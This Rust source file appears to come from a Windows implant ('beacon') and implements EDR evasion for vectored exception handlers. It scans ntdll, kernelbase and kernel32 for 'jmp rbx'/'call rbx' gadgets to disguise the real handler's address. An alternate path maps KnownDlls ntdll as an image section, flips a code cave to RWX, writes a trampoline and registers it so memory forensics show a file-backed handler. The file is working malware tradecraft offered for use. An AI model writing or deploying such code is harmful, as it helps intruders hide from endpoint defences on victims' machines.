//! Proxy VEH handler registration — hides the real VEH handler address from
//! EDR VEH-chain scanners by registering a legitimate system-DLL gadget as the
//! handler entry in the chain.
//!
//! # Two proxy modes
//!
//! ## Mode A: `jmp rbx` Gadget (synchronous exceptions)
//! For flows where we CONTROL the exception trigger (Micro-Stager INT3,
//! Fluctuation thunk HWBP restore), set RBX = real handler addr, then use a
//! `jmp rbx` (FF E3) or `call rbx` (FF D3) gadget in ntdll/kernelbase as the
//! VEH handler. EDR scans the chain → sees handler = ntdll+0xXXXXX → passes.
//!
//! **CET safe**: `call rbx` pushes return address → shadow stack records it.
//! `jmp rbx` skips shadow stack but doesn't violate it (no CALL/RET mismatch).
//!
//! **CFG safe**: The gadget is within ntdll's `.text` which IS in the CFG
//! bitmap. The target (RBX value) must be marked via `cfg_user::mark_addr_cfg_valid`.
//!
//! ## Mode B: Section-Backed Handler (asynchronous HWBP exceptions)
//! For CPU-triggered HWBP exceptions where we can't control RBX before the
//! exception fires, map the real handler code via `NtCreateSection(SEC_IMAGE)`
//! from a legitimate DLL so the handler address appears file-backed and
//! shares the same backing file as ntdll. Memory forensics show it as a
//! legitimate mapped image, not unbacked private memory.
//!
//! Combined with LACUNA ghost frames (call-stack spoofing), the handler's
//! execution context looks like deep ntdll unwinding.
//!
//! # Usage
//! ```text
//! // Scan for gadgets (once at init):
//! proxy_veh::init_proxy_gadgets();
//!
//! // For sync exception (Micro-Stager INT3 → restore HWBPs):
//! // Set RBX = real_handler, trigger exception → dispatcher → jmp rbx → handler
//!
//! // For async HWBP registration:
//! let handle = proxy_veh::register_section_backed_handler(real_handler);
//! ```

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

// ---- Global gadget cache -------------------------------------------------

/// Cached `jmp rbx` (FF E3) gadget address in a signed system DLL, or 0.
static JMP_RBX_GADGET: AtomicUsize = AtomicUsize::new(0);

/// Cached `call rbx` (FF D3) gadget address, or 0.
static CALL_RBX_GADGET: AtomicUsize = AtomicUsize::new(0);

/// The module base where the gadget was found (for origin verification).
#[allow(dead_code)]
static GADGET_MODULE_BASE: AtomicUsize = AtomicUsize::new(0);

/// Whether the proxy subsystem is initialized (gadgets scanned).
static PROXY_READY: AtomicBool = AtomicBool::new(false);

/// Whether proxy mode should be used for HWBP blind operations.
/// Default ON if gadgets were found during init.
static PROXY_ENABLED: AtomicBool = AtomicBool::new(false);

// ---- Public API -----------------------------------------------------------

/// Initialize the proxy subsystem: scan ntdll and kernelbase for
/// `jmp rbx` / `call rbx` gadgets. Safe to call multiple times;
/// subsequent calls are no-ops.
///
/// # Safety
/// Must run after PEB-walk bootstrap (ntdll must be located).
/// Single-threaded beacon context.
pub unsafe fn init_proxy_gadgets() {
    if PROXY_READY.load(Ordering::Acquire) {
        return;
    }

    // Scan ntdll first (always loaded, no import dependency).
    if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"ntdll.dll") {
        JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
        CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
    }

    // If ntdll didn't have usable gadgets, try kernelbase.
    if jmp_rbx_gadget() == 0 {
        if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"kernelbase.dll") {
            JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
            CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
        }
    }

    // Try kernel32 as last resort.
    if jmp_rbx_gadget() == 0 {
        if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"kernel32.dll") {
            JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
            CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
        }
    }

    PROXY_READY.store(true, Ordering::Release);
    PROXY_ENABLED.store(
        jmp_rbx_gadget() != 0 || call_rbx_gadget() != 0,
        Ordering::Release,
    );
}

/// Whether a proxy gadget was found and proxy mode is available.
pub fn proxy_available() -> bool {
    PROXY_ENABLED.load(Ordering::Acquire)
}

/// The cached `jmp rbx` gadget address, or 0 if not found.
pub fn jmp_rbx_gadget() -> usize {
    JMP_RBX_GADGET.load(Ordering::Acquire)
}

/// The cached `call rbx` gadget address, or 0 if not found.
pub fn call_rbx_gadget() -> usize {
    CALL_RBX_GADGET.load(Ordering::Acquire)
}

/// Get the preferred proxy handler address for VEH registration.
/// Prefers `call rbx` (CET-safe) over `jmp rbx`.
pub fn proxy_handler_addr() -> usize {
    let call = call_rbx_gadget();
    if call != 0 {
        call
    } else {
        jmp_rbx_gadget()
    }
}

/// Set proxy mode on/off at runtime.
pub fn set_proxy_enabled(on: bool) {
    PROXY_ENABLED.store(on, Ordering::Release);
}

/// Whether proxy mode is currently enabled.
pub fn proxy_enabled() -> bool {
    PROXY_ENABLED.load(Ordering::Acquire)
}

// ---- Section-backed handler registration (Mode B) -------------------------

/// Register a VEH handler where the handler address appears file-backed
/// (mapped from `\KnownDlls\ntdll.dll` via `SEC_IMAGE` section).
///
/// # Status: dead code — pending wiring (Mode B, unselected)
///
/// Fully implemented (NtOpenFile → NtCreateSection → NtMapViewOfSection →
/// code-cave copy → AddVectoredExceptionHandler) but ZERO callers in the
/// implant. The active HWBP / VEH registration path uses
/// `AddVectoredExceptionHandler` directly (Mode A) rather than the
/// section-backed variant (Mode B). Kept as an alternate evasion route for
/// engagements that need the handler address to resolve to
/// `\KnownDlls\ntdll.dll` under memory forensics. Do NOT delete — see
/// ROADMAP: "proxy_veh Mode B".
///
/// # How it works
/// 1. Opens `\KnownDlls\ntdll.dll` via `NtOpenFile` + `NtCreateSection(SEC_IMAGE)`
/// 2. Maps a view of the section at a random address via `NtMapViewOfSection`
/// 3. Copies the real handler's first 256 bytes (prologue + first VEH frame)
///    into a code cave in the mapped view (using a `.text` gap from LACUNA)
/// 4. Registers the gap address as the VEH handler
/// 5. The handler address is now in memory backed by `\KnownDlls\ntdll.dll`
///
/// # Limitations
/// - Requires `\KnownDlls\ntdll.dll` to be accessible (available on all NT 6.1+)
/// - The handler code must fit in the identified code cave (typically 32-128 bytes)
/// - This creates a CoW page that differs from the canonical ntdll mapping,
///   but memory forensics still show `\KnownDlls\ntdll.dll` as the backing file.
///
/// # Safety
/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
#[allow(dead_code)]
pub unsafe fn register_section_backed_handler(
    handler: unsafe extern "system" fn(usize) -> i32,
) -> *mut c_void {
    // Resolve the NT APIs we need.
    let nt_open = match crate::resolve::export_addr(b"ntdll.dll", b"NtOpenFile") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    let nt_create_sec = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateSection") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    let nt_map_view = match crate::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };

    // Open \KnownDlls\ntdll.dll — this is the canonical backing file.
    // Use a UNICODE_STRING on the stack for the path.
    let path: [u16; 43] = [
        b'\\' as u16,
        b'K' as u16,
        b'n' as u16,
        b'o' as u16,
        b'w' as u16,
        b'n' as u16,
        b'D' as u16,
        b'l' as u16,
        b'l' as u16,
        b's' as u16,
        b'\\' as u16,
        b'n' as u16,
        b't' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        b'.' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ];

    #[repr(C)]
    struct UnicodeString {
        len: u16,
        max_len: u16,
        buffer: *const u16,
    }

    #[repr(C)]
    struct ObjectAttributes {
        len: u32,
        root_dir: usize,
        obj_name: *const UnicodeString,
        attrs: u32,
        sec_desc: usize,
        sec_qos: usize,
    }

    let us = UnicodeString {
        len: 40,     // 20 chars * 2
        max_len: 86, // 43 * 2
        buffer: path.as_ptr(),
    };
    let oa = ObjectAttributes {
        len: core::mem::size_of::<ObjectAttributes>() as u32,
        root_dir: 0,
        obj_name: &us,
        attrs: 0x40, // OBJ_CASE_INSENSITIVE
        sec_desc: 0,
        sec_qos: 0,
    };

    #[repr(C)]
    struct IoStatusBlock {
        _status: i32,
        _info: usize,
    }

    type NtOpenFileFn = unsafe extern "system" fn(
        *mut usize,
        u32,
        *const ObjectAttributes,
        *mut IoStatusBlock,
        u32,
        u32,
    ) -> i32;
    let open_fn: NtOpenFileFn = core::mem::transmute(nt_open);

    let mut file_handle: usize = 0;
    let mut iosb = IoStatusBlock {
        _status: 0,
        _info: 0,
    };
    let st = open_fn(
        &mut file_handle,
        0x8010_0000, // GENERIC_READ | SYNCHRONIZE
        &oa,
        &mut iosb,
        1, // FILE_SHARE_READ
        1, // FILE_SYNCHRONOUS_IO_NONALERT
    );
    if st < 0 {
        return core::ptr::null_mut();
    }

    // Create a SEC_IMAGE section from the file handle.
    type NtCreateSectionFn = unsafe extern "system" fn(
        *mut usize,
        u32,
        *const ObjectAttributes,
        *mut i64,
        u32,
        u32,
        usize,
    ) -> i32;
    let sec_fn: NtCreateSectionFn = core::mem::transmute(nt_create_sec);

    let mut sec_handle: usize = 0;
    let mut sec_size: i64 = 0;
    let st2 = sec_fn(
        &mut sec_handle,
        0x000F_0007,       // SECTION_ALL_ACCESS
        core::ptr::null(), // no object attributes
        &mut sec_size,
        0x02,        // PAGE_READONLY
        0x0100_0000, // SEC_IMAGE
        file_handle,
    );
    // Close file handle regardless.
    type NtCloseFn = unsafe extern "system" fn(usize) -> i32;
    let _nt_close = match crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
        Some(a) => {
            let f: NtCloseFn = core::mem::transmute(a);
            f(file_handle);
        }
        None => {}
    };

    if st2 < 0 {
        return core::ptr::null_mut();
    }

    // Map a view.
    type NtMapViewFn = unsafe extern "system" fn(
        usize,
        usize,
        *mut *mut c_void,
        usize,
        usize,
        *mut i64,
        *mut usize,
        u32,
        u32,
        u32,
    ) -> i32;
    let map_fn: NtMapViewFn = core::mem::transmute(nt_map_view);

    let mut view_base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = 0;
    let mut view_offset: i64 = 0;
    let st3 = map_fn(
        sec_handle,
        (-1isize) as usize, // CurrentProcess
        &mut view_base,
        0,
        0,
        &mut view_offset,
        &mut view_size,
        2,    // ViewUnmap (allows partial unmap)
        0,    // MEM_TOP_DOWN = 0
        0x20, // PAGE_EXECUTE_READ
    );
    // Close section handle.
    type NtCloseFn2 = unsafe extern "system" fn(usize) -> i32;
    if let Some(a) = crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
        let f: NtCloseFn2 = core::mem::transmute(a);
        f(sec_handle);
    }

    if st3 < 0 || view_base.is_null() {
        return core::ptr::null_mut();
    }

    // We now have a view of ntdll mapped at view_base. The view is RX only.
    // We need to write our handler into a code cave in the .text section.
    // Find a suitable gap using LACUNA's pdata scanner (if available) or
    // a simple scan for INT3 padding bytes (0xCC).

    let gap_addr = match find_code_cave(view_base, view_size) {
        Some(g) => g,
        None => {
            // Unmap and return null.
            type NtUnmapViewFn = unsafe extern "system" fn(usize, *mut c_void) -> i32;
            if let Some(a) = crate::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
                let f: NtUnmapViewFn = core::mem::transmute(a);
                f((-1isize) as usize, view_base);
            }
            return core::ptr::null_mut();
        }
    };

    // The gap is in the RX view. We need to write our handler code there.
    // Change protection: RX → RWX → write → RX.
    type NtProtectVmFn =
        unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
    let nt_protect = match crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory") {
        Some(a) => a,
        None => {
            // Can't write to the gap — fall back to direct registration.
            return register_veh_direct(handler);
        }
    };
    let prot_fn: NtProtectVmFn = core::mem::transmute(nt_protect);

    let gap_page = (gap_addr & !0xFFF) as *mut c_void;
    let mut page_region: *mut c_void = gap_page;
    let mut page_size: usize = 0x1000;
    let mut old_prot: u32 = 0;

    let protect_st = prot_fn(
        (-1isize) as usize,
        &mut page_region,
        &mut page_size,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old_prot,
    );
    if protect_st < 0 {
        return register_veh_direct(handler);
    }

    // Write a tiny trampoline at the gap:
    //   mov rax, <handler_addr>
    //   jmp rax
    // 10 bytes total: 48 B8 XX XX XX XX XX XX XX XX  FF E0
    let tramp = gap_addr as *mut u8;
    core::ptr::write(tramp, 0x48u8); // REX.W
    core::ptr::write(tramp.add(1), 0xB8u8); // MOV RAX, imm64
    let handler_bytes = (handler as usize).to_le_bytes();
    for i in 0..8 {
        core::ptr::write(tramp.add(2 + i), handler_bytes[i]);
    }
    core::ptr::write(tramp.add(10), 0xFFu8); // JMP RAX
    core::ptr::write(tramp.add(11), 0xE0u8);

    // Restore protection.
    let mut rw_region: *mut c_void = gap_page;
    let mut rw_size: usize = 0x1000;
    let mut _dummy: u32 = 0;
    prot_fn(
        (-1isize) as usize,
        &mut rw_region,
        &mut rw_size,
        0x20, // PAGE_EXECUTE_READ
        &mut _dummy,
    );

    // Mark the trampoline as CFG-valid.
    crate::cfg_user::mark_addr_cfg_valid(gap_addr);

    // Register the gap address as the VEH handler.
    register_veh_at(gap_addr)
}

/// Default direct VEH registration (fallback when section-backed fails).
unsafe fn register_veh_direct(handler: unsafe extern "system" fn(usize) -> i32) -> *mut c_void {
    let aveh = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
    {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type AddVehFn =
        unsafe extern "system" fn(u32, unsafe extern "system" fn(usize) -> i32) -> *mut c_void;
    let f: AddVehFn = core::mem::transmute(aveh);
    f(1, handler)
}

/// Register VEH handler at a specific address (the proxy gadget).
unsafe fn register_veh_at(addr: usize) -> *mut c_void {
    let aveh = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
    {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type AddVehFn =
        unsafe extern "system" fn(u32, unsafe extern "system" fn(usize) -> i32) -> *mut c_void;
    let f: AddVehFn = core::mem::transmute(aveh);
    // Transmute addr → fn pointer. This is the proxy: the VEH dispatcher
    // calls `addr(ExceptionPointers)` directly. The code at `addr`
    // (our trampoline or gadget) handles the redirect.
    let handler: unsafe extern "system" fn(usize) -> i32 = core::mem::transmute(addr);
    f(1, handler)
}

// ---- Code cave scanner ----------------------------------------------------

/// Find a code cave (padding bytes) in the mapped view suitable for a small
/// trampoline. Searches for 16+ consecutive 0xCC (INT3) or 0x90 (NOP) bytes
/// within the executable sections.
unsafe fn find_code_cave(view_base: *mut c_void, _view_size: usize) -> Option<usize> {
    let (sections, num) = pe_sections(view_base as *mut u8)?;

    for i in 0..num {
        let sec = &*sections.add(i);
        let sec_name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if sec_name[0] != b'.' || sec_name[1] != b't' || sec_name[2] != b'e' {
            continue;
        }
        let sec_va = sec.virtual_address as usize;
        let sec_size = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        let sec_start = view_base as usize + sec_va;
        let sec_bytes = core::slice::from_raw_parts(sec_start as *const u8, sec_size.min(0x100000));

        let mut run_start: usize = 0;
        let mut run_byte: u8 = 0;
        for (j, &b) in sec_bytes.iter().enumerate() {
            if b == 0xCC || b == 0x90 {
                if run_start == 0 || b != run_byte {
                    run_start = j;
                    run_byte = b;
                }
                if j - run_start >= 16 {
                    // Verify this is inter-function padding (preceded by ret/int3),
                    // not intra-function NOPs inside a hot function.
                    if run_start > 0 {
                        let prev = sec_bytes[run_start - 1];
                        if prev != 0xC3 && prev != 0xCC {
                            continue; // Skip — likely intra-function padding
                        }
                    }
                    return Some(sec_start + run_start);
                }
            } else {
                run_start = 0;
            }
        }
    }
    None
}

// ---- Gadget scanner -------------------------------------------------------

struct FoundGadgets {
    jmp_rbx: Option<usize>,  // FF E3
    call_rbx: Option<usize>, // FF D3
}

/// Scan a module by name for useful gadgets.
unsafe fn scan_module_for_gadgets(name: &[u8]) -> (Option<*mut u8>, Option<FoundGadgets>) {
    let base = match crate::resolve::module_base_by_name(name) {
        Some(b) => b,
        None => return (None, None),
    };
    let (sections, num) = match pe_sections(base) {
        Some(s) => s,
        None => return (None, None),
    };

    for i in 0..num {
        let sec = &*sections.add(i);
        let sec_name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if sec_name[0] != b'.' || sec_name[1] != b't' || sec_name[2] != b'e' {
            continue;
        }
        let sec_va = sec.virtual_address as usize;
        let sec_size = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        let sec_start = base as usize + sec_va;
        let bytes = core::slice::from_raw_parts(sec_start as *const u8, sec_size.min(0x200000));

        let mut result = FoundGadgets {
            jmp_rbx: None,
            call_rbx: None,
        };
        for (j, &b) in bytes.iter().enumerate().take(bytes.len().saturating_sub(1)) {
            if b == 0xFF && bytes[j + 1] == 0xE3 {
                if result.jmp_rbx.is_none() {
                    result.jmp_rbx = Some(sec_start + j);
                }
            }
            if b == 0xFF && bytes[j + 1] == 0xD3 {
                if result.call_rbx.is_none() {
                    result.call_rbx = Some(sec_start + j);
                }
            }
            if result.jmp_rbx.is_some() && result.call_rbx.is_some() {
                break;
            }
        }
        if result.jmp_rbx.is_some() || result.call_rbx.is_some() {
            return (Some(base), Some(result));
        }
    }
    (Some(base), None)
}

// ---- PE header types ------------------------------------------------------

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pad: [u32; 3],
    _characteristics: u32,
}

/// Read PE section headers correctly using SizeOfOptionalHeader from FileHeader.
unsafe fn pe_sections(base: *mut u8) -> Option<(*const ImageSectionHeader, usize)> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let pe_sig = *((base as usize + dos.e_lfanew as usize) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }
    let fh = &*((base as usize + dos.e_lfanew as usize + 4) as *const ImageFileHeader);
    let off = dos.e_lfanew as usize + 4 + 20 + fh.size_of_optional_header as usize;
    Some((
        (base as usize + off) as *const ImageSectionHeader,
        fh.number_of_sections as usize,
    ))
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: verify gadget scanning works and returns valid addresses.
/// Returns:
/// - 0 = no proxy gadgets found
/// - 1 = jmp rbx found
/// - 2 = call rbx found
/// - 3 = both found
pub fn selftest_proxy_gadgets() -> u8 {
    let jmp = jmp_rbx_gadget();
    let call = call_rbx_gadget();
    match (jmp != 0, call != 0) {
        (false, false) => 0,
        (true, false) => 1,
        (false, true) => 2,
        (true, true) => 3,
    }
}
